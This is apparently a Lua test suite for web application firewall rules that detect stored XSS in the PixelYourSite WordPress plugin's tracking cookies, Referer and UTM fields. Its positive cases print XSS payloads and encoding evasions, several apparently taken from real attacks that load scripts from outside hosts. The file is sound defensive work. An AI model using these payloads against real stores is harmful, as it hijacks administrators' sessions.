-- Tests for the PixelYourSite unauth stored-XSS detectors (rules 10025 and
-- 10026, WAF_CVE; CVE-2026-1844 / CVE-2026-1841 / CVE-2026-109987).
-- Production tier: block (10026 with its autoblock held).
--
-- The plugin stores the traffic source, the landing page and the UTMs of a
-- WooCommerce Store API checkout in the order and, before the fix, printed
-- them unescaped in the order screen. The positives are the payload shapes
-- found in planted orders on the fleet (2026-02-13 .. 2026-10-10) and the
-- other ways into the same fields (session copies of the Referer host and the
-- request path, utm_* query fields, a javascript: landing URL); the negatives
-- are what the plugin's own JS stores there and other traffic that merely
-- mentions the names.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

-- o: { cookie, referer, args, raw_uri, method, uri }
local function req(o)
  o = o or {}
  return { uri = o.uri or "/", args = o.args or "", method = o.method or "GET",
           raw_uri = o.raw_uri, ip = "203.0.113.96",
           headers = { referer = o.referer }, body = "", cookie = o.cookie or "" }
end
local function ck(c) return req({ cookie = c }) end

local function fires(c, label, want_reason)
  local hit, reason = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want_reason, label .. " — reason=" .. want_reason .. " (got " .. tostring(reason) .. ")")
end
local function clean(c, label)
  local hit, reason = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got " .. tostring(reason) .. ")")
end

local P = "WAF_CVE:CVE_2026_1844:PIXELYOURSITE:"
local MARKUP, ATTR, SCRIPT_URL = P .. "COOKIE_MARKUP", P .. "COOKIE_ATTR_BREAKOUT", P .. "COOKIE_SCRIPT_URL"
local REF, UTM = P .. "REFERER_HOST_MARKUP", P .. "QUERY_UTM_MARKUP"
local PATH, PATH_ATTR = P .. "PATH_MARKUP", P .. "PATH_ATTR_BREAKOUT"

set_only({ rule_cve_pixelyoursite_xss = "block", rule_cve_pixelyoursite_path_xss = "block" })

-- ── 10025 cookies: the fleet's planted shapes ───────────────────────────────
fires(req({ method = "POST", uri = "/wp-json/wc/store/v1/checkout",
            cookie = 'pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"; pys_landing_page="<!--P1181854187-->"' }),
      "tophair 2026-10-10 payload on the Store API checkout", MARKUP)
fires(req({ uri = "/", args = "add-to-cart=11533&quantity=4",
            cookie = 'woocommerce_cart_hash=x; pysTrafficSource="<script src=https://apix1.com/testx.js></script><!--P114512257-->"' }),
      "payload rides on the session's first GET too", MARKUP)
fires(ck('pys_landing_page="<svg onload=alert(document.domain)><!--PYS3545786-->"'),
      "polygraf probe in the landing-page cookie", MARKUP)
fires(ck('last_pysTrafficSource=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'),
      "URL-encoded markup in the last_ twin (PHP decodes cookie values)", MARKUP)
fires(ck('a=1;pysTrafficSource=<script>x</script>'), "no space after the ';' delimiter", MARKUP)
fires(ck('a=1;\t  pysTrafficSource=<b>'), "whitespace-padded name (PHP drops it)", MARKUP)
fires(ck('%70ysTrafficSource=%3Cscript%3E'), "encoded name over-reads on the safe side", MARKUP)
fires(ck('PYSTRAFFICSOURCE=<script>'), "case variant over-reads on the safe side", MARKUP)
fires(ck('pys.landing.page=x<b>y'), "dotted name PHP registers as pys_landing_page", MARKUP)
fires(ck('pys_utm_source=<img src=x onerror=alert(1)>'), "UTM cookie (printUtm prints it raw)", MARKUP)
fires(ck('last_pys_utm_campaign=%3Csvg%2Fonload%3Dalert(1)%3E'), "last_ UTM cookie", MARKUP)

-- attribute breakout (the landing page sits in href="...")
fires(ck('pys_landing_page=https://shop.gr/" onmouseover="alert(1)'), "space-separated handler", ATTR)
fires(ck('pys_landing_page=https://shop.gr/x"onmouseover="alert(1)'), "handler with no space", ATTR)
fires(ck('pys_landing_page=x%22%2Fstyle%3D%22x'), "encoded quote + /style=", ATTR)
fires(ck('pys_landing_page=x" tabindex=1 autofocus onfocus=alert(1) x="'), "other attributes before the handler (review BP1)", ATTR)
fires(ck('pys_landing_page=x%22%20title%3Dy%20onmouseover%3Dalert(1)'), "encoded, title= first", ATTR)

-- a landing URL that runs on click
fires(ck('pys_landing_page=javascript:alert(document.cookie)'), "javascript: landing URL", SCRIPT_URL)
fires(ck('pys_landing_page=javascript%3Aalert(1)'), "encoded colon", SCRIPT_URL)
fires(ck('last_pys_landing_page=java%09script:alert(1)'), "tab inside the scheme (browsers drop it)", SCRIPT_URL)
fires(ck('pys_landing_page="data:text/html;base64,PHNjcmlwdD4="'), "quoted data: URL", SCRIPT_URL)
fires(ck('pys_landing_page=javascript&colon;alert(1)'), "&colon; (HTML decodes it in href; review BP2)", SCRIPT_URL)
fires(ck('pys_landing_page=javascript%26%2358%3Balert(1)'), "encoded &#58;", SCRIPT_URL)
fires(ck('pys_landing_page=%26%23106%3Bavascript:alert(1)'), "&#106; for the j", SCRIPT_URL)
fires(ck('pys_landing_page=java%26Tab%3Bscript:alert(1)'), "&Tab; inside the scheme (encoded: a raw ; ends the cookie)", SCRIPT_URL)

-- ── 10025 Referer host (getTrafficSource copies parse_url(...)['host']) ─────
fires(req({ referer = "http://x<img src=x onerror=alert(1)>y" }), "markup in the host", REF)
fires(req({ referer = "https://u:p@a<svg onload=alert(1)>b:8080/path" }), "past userinfo, before the port", REF)
fires(req({ referer = "//<script>?q=1" }), "scheme-relative", REF)
fires(req({ referer = "<img src=x onerror=alert(1)>:80" }), "host:port form, no //", REF)
fires(req({ referer = "<svg/onload=alert(1)>:443/x" }), "host:port form with a path", REF)

-- ── 10025 utm_* request fields (PHP $_GET) ──────────────────────────────────
fires(req({ args = "utm_source=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" }), "encoded markup in utm_source", UTM)
fires(req({ args = "a=1&utm.content=<b>" }), "dotted key PHP registers as utm_content", UTM)

-- ── 10026 raw request path (the landing page's session copy) ───────────────
fires(req({ raw_uri = "/<iframe/srcdoc=x>" }), "raw markup in the path", PATH)
fires(req({ raw_uri = '/x"onmouseover="alert(1)?a=1' }), "quote opening an attribute in the path", PATH_ATTR)
fires(req({ raw_uri = '/x"/title=y/onmouseover=alert(1)' }), "slash-separated attributes (review BP1)", PATH_ATTR)
fires(req({ raw_uri = '/x"autofocus/onfocus=alert(1)' }), "autofocus then onfocus", PATH_ATTR)

-- ── Negatives ───────────────────────────────────────────────────────────────
clean(req(), "nothing")
clean(ck("pysTrafficSource=google.com; pys_landing_page=https%3A%2F%2Fshop.gr%2Fproduct%2Fx%2F%3Fsrsltid%3DAU7gw4Up"),
      "plugin's real values (host + encoded URL)")
clean(ck("pysTrafficSource=direct; last_pysTrafficSource=direct; pys_landing_page=undefined"), "direct / undefined")
clean(ck("pysTrafficSource=REST API"), "the plugin's own REST API marker")
clean(ck('pysTrafficSource="google.com"'), "legal quoted cookie value")
clean(ck('pys_landing_page="https://shop.gr/?utm_content=abc&onsale=1"'), "quoted URL with utm_content / onsale (F1)")
clean(ck('pys_landing_page="https://shop.gr/p/lifestyle=x"'), "quoted URL with lifestyle=")
clean(ck("pys_landing_page=http%3A%2F%2Fshop.gr%2F"), "http landing URL")
clean(ck("pys_landing_page=%2Fcategory%2Fshoes%2F"), "relative landing path")
clean(ck("pys_landing_page=https%3A%2F%2Fshop.gr%2F%3Fq%3Dcats%2520%2526%2520dogs"),
      "double-encoded query stays encoded after one decode")
clean(ck("pys_utm_source=facebook; pys_utm_medium=cpc; pys_utm_campaign=summer:sale"), "real UTM cookies")
clean(ck("pys_session_limit=true; pys_start_session=true; pysAddToCartFragmentId=x"), "other PixelYourSite cookies")
clean(ck("foo=<b>; bar=x"), "markup in an unrelated cookie (not this rule's job)")
clean(ck('foo=pysTrafficSource=<script>'), "target name only inside another cookie's value")
clean(ck("xpysTrafficSource=<script>; pysTrafficSourcex=<script>"), "near-miss names")
clean(ck("wordpress_logged_in_abc=admin%7C123; wp-settings-1=x"), "normal WP session cookies")
clean(req({ referer = "https://www.google.com/" }), "normal external Referer")
clean(req({ referer = "https://xn--hxargifdar.gr/path" }), "IDN Referer")
clean(req({ referer = "https://shop.gr/search?q=<script>" }), "markup in the Referer QUERY")
clean(req({ referer = "https://shop.gr/<b>/x" }), "markup in the Referer path")
clean(req({ referer = "https:/x?u=//<b>" }), "a // only in the Referer query (F2)")
clean(req({ args = "utm_source=newsletter&utm_campaign=summer+sale" }), "real utm query")
clean(req({ args = "q=<b>" }), "markup in a non-utm field (rule 302's job)")
clean(req({ raw_uri = "/product/%3Cb%3E?x=<b>" }), "encoded path, markup only in the query")
clean(req({ raw_uri = "/shop/it's-fine/" }), "apostrophe in a path")
clean(req({ raw_uri = '/search/"red shoes"' }), "quoted words in a path, no handler")
clean(req({ raw_uri = "/a>b" }), "bare > in a path")
-- review FP1: campaign names carry bare < and >
clean(req({ args = "utm_campaign=Retargeting%20%3E%2030%20days" }), "utm with a bare >")
clean(req({ args = "utm_campaign=%3C3%20valentines" }), "utm with <3")
clean(ck("pys_utm_campaign=RT%20%3E%2030d; last_pys_utm_campaign=Sale >50%"), "UTM cookies with a bare >")
clean(ck("pys_utm_campaign=%3C3%20valentines"), "UTM cookie with <3")
-- review FP2: the plugin reads $_GET only
do
  local c = req({ method = "POST", uri = "/contact/" })
  c.body = "utm_source=%3Cb%3E&name=x"
  c.headers["content-type"] = "application/x-www-form-urlencoded"
  clean(c, "utm_* in a POST body")
end
-- review FP3: a landing value with a port and no scheme
clean(ck("pys_landing_page=www.shop.gr:8080/x"), "host:port landing value")
clean(ck("pys_landing_page=localhost:8080"), "localhost:port landing value")
clean(ck("pys_landing_page=https%3A%2F%2Fshop.gr%2F%3Fa%3D1%26amp%3Bb%3D2"), "https URL with an &amp;")

check(det.detect_cve_pixelyoursite_xss("a=%3C") == nil, "a %-bearing cookie without a target name")
check(det.detect_cve_pixelyoursite_xss(nil) == nil, "nil everything")
check(det.detect_cve_pixelyoursite_path_xss(nil) == nil, "no raw_uri (panel gate)")

set_only({ rule_cve_pixelyoursite_xss = "disabled", rule_cve_pixelyoursite_path_xss = "disabled" })
clean(ck('pysTrafficSource=<script>'), "10025 disabled")
clean(req({ raw_uri = "/<b>" }), "10026 disabled")

if fails > 0 then
  io.stderr:write(("cfm_waf PixelYourSite CVE tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf PixelYourSite stored XSS (rules 10025/10026, CVE-2026-1844)")
